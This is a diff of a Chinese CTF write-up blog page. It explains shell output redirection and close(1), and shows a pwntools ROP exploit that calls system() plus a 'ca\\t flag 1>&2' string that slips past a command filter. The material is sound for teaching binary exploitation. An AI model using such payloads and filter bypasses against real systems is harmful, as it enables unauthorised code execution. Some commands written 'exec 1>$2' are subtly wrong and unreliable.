@@ -22,8 +22,11 @@
 <meta property="og:image" content="https://2023478.github.io/2024/04/28/shell%E7%9A%84%E8%8E%B7%E5%8F%96%EF%BC%8C%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91he%E4%BE%8B%E9%A2%98/image-20240428213213551.png">
 <meta property="og:image" content="https://2023478.github.io/2024/04/28/shell%E7%9A%84%E8%8E%B7%E5%8F%96%EF%BC%8C%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91he%E4%BE%8B%E9%A2%98/image-20240428214648408.png">
 <meta property="og:image" content="https://2023478.github.io/2024/04/28/shell%E7%9A%84%E8%8E%B7%E5%8F%96%EF%BC%8C%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91he%E4%BE%8B%E9%A2%98/image-20240428220239242.png">
+<meta property="og:image" content="https://2023478.github.io/2024/04/28/shell%E7%9A%84%E8%8E%B7%E5%8F%96%EF%BC%8C%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91he%E4%BE%8B%E9%A2%98/image-20240429111056137.png">
+<meta property="og:image" content="https://2023478.github.io/2024/04/28/shell%E7%9A%84%E8%8E%B7%E5%8F%96%EF%BC%8C%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91he%E4%BE%8B%E9%A2%98/image-20240429112924204.png">
+<meta property="og:image" content="https://2023478.github.io/2024/04/28/shell%E7%9A%84%E8%8E%B7%E5%8F%96%EF%BC%8C%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91he%E4%BE%8B%E9%A2%98/image-20240429115911123.png">
 <meta property="article:published_time" content="2024-04-28T12:11:01.000Z">
-<meta property="article:modified_time" content="2024-04-28T14:32:09.758Z">
+<meta property="article:modified_time" content="2024-04-29T03:59:43.776Z">
 <meta property="article:author" content="wgiegie">
 <meta property="article:tag" content="pwn姿势">
 <meta name="twitter:card" content="summary">
@@ -236,8 +239,8 @@
 <p>在shell命令中有一种叫Shell 输入&#x2F;输出重定向的规则，</p>
 <p>我的理解便是在shell的交互过程中，通过一些命令的作用将其不再往常一样从屏幕上输入，并向屏幕上输出。</p>
 <p>简单的就像将输入的过程重定向到某个文件中，那么shell便会将文件中的内容当命令一行一行的执行，而输出重定向则相反，通过将输出的过程重定向到某个文件，从而使shell将命令执行后的结果输出到该文件中，不再屏幕上输出。</p>
-<p>看起来这个似乎与我们的拿取flag的内容关系不大，但在有的题目中出题人为了恶心人，会将有的字母标记为不可执行的字母，或者在命令中出现这些字母便不能执行，会报错不能达到命令的既定效果。就像蓝桥杯的这道题。在程序中便禁止<code>cat</code>的同时出现与<code>b，s，/，i，n</code>这几个字符的出现。</p>
-<p>那我们输入的命令真的就不能执行吗，其实也一不一定，像将某些东西输出到屏幕上的命令如cat等其实程序是执行的不过在输出结果是，因为有之前的报错在，程序便不会再将命令的执行效果输入到屏幕上，而是将报错的内容输出到屏幕上。既然如此，那我们有没有办法将程序执行结果的覆盖报错的结果并输出到屏幕上呢（前提这个命令在没有限制的前提下是能执行有结果的），这种办法便是输入重定向。</p>
+<p>看起来这个似乎与我们的拿取flag的内容关系不大，但在有的题目中出题人为了恶心人，会将有的字母标记为不可执行的字母，或者在命令中出现这些字母便不能执行，会报错不能达到命令的既定效果。就像蓝桥杯的这道题。在程序中便禁止<code>cat</code>的同时出现与<code>b，s，/，i，n</code>这几个字符的出现，同时还用close（1）函数将程序的输出关闭。</p>
+<p>那我们输入的命令真的就不能执行吗，其实也一不一定，像将某些东西输出到屏幕上的命令如cat等其实程序是执行的不过在输出结果之前，因为程序中有close（1），程序便不会再将命令的执行效果输入到屏幕上，而是将报错的内容输出到屏幕上。既然如此，那我们有没有办法将程序执行结果的覆盖报错的结果并输出到屏幕上呢（前提这个命令在没有限制的前提下是能执行有结果的），这种办法便是输入重定向。</p>
 <p>在了解这种方法之前我们还需要知道宁外一个知识点，<em>文件描述符</em>（fd）</p>
 <p>这个文件描述符通常有数字表示</p>
 <ul>
@@ -247,6 +250,7 @@
 </ul>
 <p>0代表输入，1代表输入（正确的结果），2代表报错的内容输出</p>
 <p>既然知道这个了便可以想想在之前的重定向中输入的过程便是文件描述符中的0，正确执行结果的输出便是1，报错内容的输出便是2，那在重定向的过程中如果我们能将1的输出重定向成2，那便是将正确的结果替换成报错的结果被程序当做应该输入到屏幕上的内容输入到屏幕上。（好像有点绕，不够多看几遍应该能理解吧）</p>
+<p>在这里用这个方法的主要原因在于之前的程序中有一个close（1）这个命令，将程序的标准输出关闭了，使得程序中的执行结果的输入通道被关闭，于是程序中的命令在执行后的结果不能正确输出，于是便用重定向将标准输出替换为错误输出，将我们想要的结果输出出来。</p>
 <p>这个命令是什么呢，就是<strong>2&gt;&amp;1</strong>这个</p>
 <p>在命令中，<code>2&gt;&amp;1</code> 是用来重定向标准错误（stderr）到标准输出（stdout）的。</p>
 <ul>
@@ -271,6 +275,8 @@
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl check()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned <span class="built_in">int</span> i; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0xD</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( info[i] == <span class="string">&#x27;c&#x27;</span> &amp;&amp; info[i + <span class="number">1</span>] == <span class="string">&#x27;a&#x27;</span> &amp;&amp; info[i + <span class="number">2</span>] == <span class="string">&#x27;t&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(<span class="string">&quot;Do not use `cat` command.&quot;</span>);</span><br><span class="line">      exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( info[i] == <span class="string">&#x27;b&#x27;</span> || info[i] == <span class="string">&#x27;s&#x27;</span> || info[i] == <span class="string">&#x27;/&#x27;</span> || info[i] == <span class="string">&#x27;i&#x27;</span> || info[i] == <span class="string">&#x27;n&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(<span class="string">&quot;Do not use some other characters.&quot;</span>);</span><br><span class="line">      exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> close(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>这里便是其内容，简单来说便是对输入到info中的数据进行检测，使其中不能有连续的<code>cat</code>出现和<code>b，s，/，i，n</code>这几个字符的单独出现。这里看似只是检测info中的数据但是在拿到shell后会发现这个检测对向shell中输入的命令也是存在的（这已经是后话了目前主要先拿到shell）</p>
+<p>并且之这个函数的最后一行命令是<code>return close(1);</code></p>
+<p>close函数是与open函数相对的函数，open的意思在于打开某个东西的意思，而close的意思在于关闭某个东西的意思，在这里由于使用close关闭1，这里1作为单独的参数出现便表明这里的意思为前文标准输出（stdout），然后再结合关闭这个函数，在这里便是使用程序将标准输出这个通道关闭，使得在后面的程序对于执行的命令不在将执行的结果输出，看到这里其实便可以想到使用要使用重定向这个过程，将输出的过程覆盖错误输出的过程，讲我们需要的结果打印出来。</p>
 <p>在回到main函数中，仔细看这个程序会发现在程序中其实是有后门函数的</p>
 <p><img src="/2024/04/28/shell%E7%9A%84%E8%8E%B7%E5%8F%96%EF%BC%8C%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91he%E4%BE%8B%E9%A2%98/image-20240428214648408.png" alt="image-20240428214648408"></p>
 <p>有system函数，不过其中的参数没什么有，不过既然有这个函数那便可以调用这个函数，那现在我们便只用解决参数的问题然后便可以调用system函数从而获得shell，</p>
@@ -279,8 +285,40 @@
 
 <p>好像这样执行拿到shell就大工告急了，but，</p>
 <p><img src="/2024/04/28/shell%E7%9A%84%E8%8E%B7%E5%8F%96%EF%BC%8C%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91he%E4%BE%8B%E9%A2%98/image-20240428220239242.png" alt="image-20240428220239242"></p>
-<p>在shell执行命令后会发现之前checksec函数的检测还在，那现在的问题就在与如何将这个检测绕过了，</p>
-<p>其实答案就在上面知识点的那个输出重定向，便可以完美解决这里的问题，</p>
+<p>在shell执行命令后会发现之前check函数的检测还在，同时由于之前在check函数中有<code>close（1）</code>这个命令使得程序的标准输出被关闭，不能在将我们需要的结果输出只输出错误结果，那现在的问题就在与如何将这个检测绕过了。</p>
+<p>其实答案就在上面知识点的那个输出重定向，便可以完美解决这里的问题，既然程序只能输出错误结果那我就将标准输出重定向到错误结果输出这里，是程序认为，标准输出的结果是错误输出的结果将其输出。</p>
+<p>这个重定向的启动该怎么启动，在这道题中有两种方法，一种是直接打印不拿shell，宁一种是在拿到shell后使用命令重定向。</p>
+<p><em>1.拿到shell后使用命令重定向</em></p>
+<p>在拿到程序的shell后执行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="number">1</span>&gt;$<span class="number">2</span></span><br><span class="line">cat flag</span><br></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<p><img src="/2024/04/28/shell%E7%9A%84%E8%8E%B7%E5%8F%96%EF%BC%8C%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91he%E4%BE%8B%E9%A2%98/image-20240429111056137.png" alt="image-20240429111056137"></p>
+<p>解释一下第一行命令，exec这个命令的意思在于，在当前shell的前提下重新再打开一个shell，并且结合后面的命令对这个新的shell进行改变。后面这个1&gt;$2,便是输出重定向的内容，</p>
+<p>全意便是，在当前这个shell的前提下重新打开一个shell，并且在这个shell中程序的标准输出将覆盖错误输出，由于在之前的shell中，标准输出已知被关闭了，如果我们输入cat等命令只会输出错误结果。而在新的shell中程序会把cat等命令的标准输出当做错误结果输出。这样我们便可以在新的shell中拿到flag的值。</p>
+<p><em>2.直接打印不拿shell</em></p>
+<p>输出重定向的过程除了重新启动一个新的shell完，还可以在单独的命令中使用如</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag <span class="number">1</span>&gt;$<span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>在这里程序便会将这一行命令的标准输出覆盖错误输出，将执行结果输出，不过在拿到shell后想执行这个命令并不能成功，</p>
+<p><img src="/2024/04/28/shell%E7%9A%84%E8%8E%B7%E5%8F%96%EF%BC%8C%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91he%E4%BE%8B%E9%A2%98/image-20240429112924204.png" alt="image-20240429112924204"></p>
+<p>其主要原因我估计还是在对cat的检查上便已经停止执行了。</p>
+<p>既然在shell中执行不成功，那我们便要想其他办法，来将flag打印出来。</p>
+<p>其实在之前的system函数的执行中就有一种办法，在system函数的执行除了执行<code>/bin/sh</code>拿到shell外，其实还可以直接执行<code>cat flag</code>这个参数将flag的内容打印出来，不过由于这个参数一般不好找故不常用，不过在这里由于一开始可以向一个地址输入数据，所以这里是可以用的，在加上之前的重定位，关于close（1）的这里便可以绕过，</p>
+<p>但是这里还有一个关于cat的检查，这个其实也有办法绕过，可以再命令中使用<strong>‘\’</strong>这个加载cat的中间，使其成为<code>c\at或c\at</code>,在shall命令中**’\‘**这个并不代表任何意思，无论你加在哪里都没有问题，程序都会默认执行，不去管这个符号的存在，那这样我们便可以利用这个符号绕过cat的检测。</p>
+<p>但这个符号的使用会出现很多问题，</p>
+<ol>
+<li>不能再shell中使用，因为我们的shell是通过python链接的故单独的\会被程序认为是\\从而出现错误（在py语法中\\才能在打印过程中表示\）</li>
+<li>在输入程序中也不许用\\才能输入\</li>
+</ol>
+<p>因此在程序的第一次输入中，要输入</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca\\t flag <span class="number">1</span>&gt;&amp;<span class="number">2</span>或c\\at flag <span class="number">1</span>&gt;&amp;<span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在调用这个参数通过system函数执行这样程序便会直接将flag的内容打印在屏幕上了，</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *0x4008a1&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&#x27;stack.\n&#x27;</span>,<span class="string">b&#x27;ca\\t flag 1&gt;&amp;2&#x27;</span>)</span><br><span class="line"><span class="comment">#io.sendafter(&#x27;stack.\n&#x27;,b&#x27;$0&#x27;)</span></span><br><span class="line"></span><br><span class="line">info=<span class="number">0x601090</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x400933</span></span><br><span class="line">system=<span class="number">0x4005D0</span></span><br><span class="line">ret=<span class="number">0x00000000004005ae</span></span><br><span class="line"></span><br><span class="line">printf=<span class="number">0x4008A1</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi_ret)+p64(info)+p64(ret)+p64(system)</span><br><span class="line">payload = payload.ljust(<span class="number">0x48</span>,<span class="string">b&quot;A&quot;</span>)</span><br><span class="line">io.sendafter(<span class="string">&#x27;...\n&#x27;</span>,payload)</span><br><span class="line"><span class="comment">#static-sh ./flag</span></span><br><span class="line"><span class="comment">#exec 1&gt;&amp;2   cat flag</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/04/28/shell%E7%9A%84%E8%8E%B7%E5%8F%96%EF%BC%8C%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91he%E4%BE%8B%E9%A2%98/image-20240429115911123.png" alt="image-20240429115911123"></p>
+<p>好了，那这道题就到此为止吧。run</p>
 
       
     </div>
